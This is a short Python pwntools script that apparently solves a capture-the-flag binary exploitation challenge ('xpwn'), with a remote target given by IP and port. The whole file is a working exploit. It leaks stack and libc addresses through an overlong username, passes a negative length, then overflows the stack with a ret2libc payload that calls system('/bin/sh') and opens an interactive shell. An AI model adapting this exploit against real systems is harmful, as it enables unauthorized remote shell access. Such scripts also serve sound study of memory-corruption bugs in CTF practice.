from pwn import *
import sys

if len(sys.argv) < 2:
	debug = True
else:
	debug = False

if debug:
	p = process("./xpwn")
	libc = ELF("/lib/i386-linux-gnu/libc-2.23.so")
	elf = ELF("./xpwn")
else:
	p = remote("116.85.48.105","5005")
	libc = ELF("libc.so.6")
	elf = ELF("./xpwn")

def debugf():
	gdb.attach(p,"b *0x08048732\nb *0x08048610")

context.log_level = "debug"
context.terminal = ["tmux","splitw","-h"]
#debugf()
p.sendafter("Enter username: ","a"*0x28)
p.recvuntil("a"*0x28)
leak_addr = u32(p.recv(4))
stack_base = leak_addr
log.success("stack_base:" + hex(stack_base))
leak_addr = u32(p.recv(4))
libc.address = leak_addr - 21 - libc.symbols["setbuf"]
log.success("libc_base:" + hex(libc.address))
p.sendafter("password: ",str(-1))
system = libc.symbols["system"]
binsh = libc.search("/bin/sh").next()
target = stack_base
payload = "a"*(0x4c - 0x8) + p32(target) + p32(system) + "jund" + p32(binsh)
p.sendafter("): ",payload)
p.recvuntil("All done, bye!\n")
p.interactive()
